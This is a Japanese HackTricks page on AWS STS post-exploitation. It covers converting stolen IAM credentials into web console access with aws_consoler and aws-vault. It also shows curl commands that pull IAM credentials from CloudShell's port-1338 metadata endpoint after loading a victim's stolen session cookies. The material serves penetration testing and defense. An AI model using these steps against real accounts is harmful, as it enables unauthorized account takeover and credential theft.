# AWS - STSポストエクスプロイテーション

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**最新バージョンのPEASSを入手したい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **ハッキングのトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## STS

詳細については：

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### IAMクレデンシャルからコンソールへ

IAMクレデンシャルを取得できた場合、次のツールを使用して**Webコンソールにアクセス**することができます。\
ユーザー/ロールには、**`sts:GetFederationToken`**の権限が必要です。

#### aws\_consoler

[https://github.com/NetSPI/aws\_consoler](https://github.com/NetSPI/aws\_consoler)を使用して、**Webコンソールのリンクを生成**することができます。
```bash
cd /tmp
python3 -m venv env
source ./env/bin/activate
pip install aws-consoler
aws_consoler [params...] #This will generate a link to login into the console
```
{% hint style="warning" %}
IAMユーザーには`sts:GetFederationToken`の権限があることを確認するか、アサインするロールを提供してください。
{% endhint %}

#### aws-vault

[**aws-vault**](https://github.com/99designs/aws-vault)は、開発環境でAWSの資格情報を安全に保存およびアクセスするためのツールです。
```bash
aws-vault list
aws-vault exec jonsmith -- aws s3 ls # Execute aws cli with jonsmith creds
aws-vault login jonsmith # Open a browser logged as jonsmith
```
{% hint style="info" %}
**aws-vault**を使用して、**ブラウザのコンソールセッション**を取得することもできます。
{% endhint %}

#### コンソールからIAMクレデンシャルへ

ウェブコンソールへのアクセスを何らかの方法で妨害できた場合（おそらくクッキーを盗んで.awsフォルダにアクセスできなかった場合）、**CloudShell**を介してそのユーザーのIAMトークンクレデンシャルを取得することができます。

CloudShellは、**ポート1338の未公開エンドポイント**を介してIAMクレデンシャルを公開します。被害者からのセッションクッキーをブラウザに読み込んだ後、CloudShellに移動し、以下のコマンドを実行してIAMクレデンシャルを取得できます。
```bash
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```
<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もし **HackTricks で会社を宣伝したい** または **PEASS の最新バージョンにアクセスしたい** または **HackTricks を PDF でダウンロードしたい** 場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式の PEASS & HackTricks スワッグ**](https://peass.creator-spring.com) を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を見つけて、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを発見しましょう
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォロー** しましょう。
* **ハッキングのトリックを共有するために、PR を** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **の GitHub リポジトリに提出してください。**

</details>
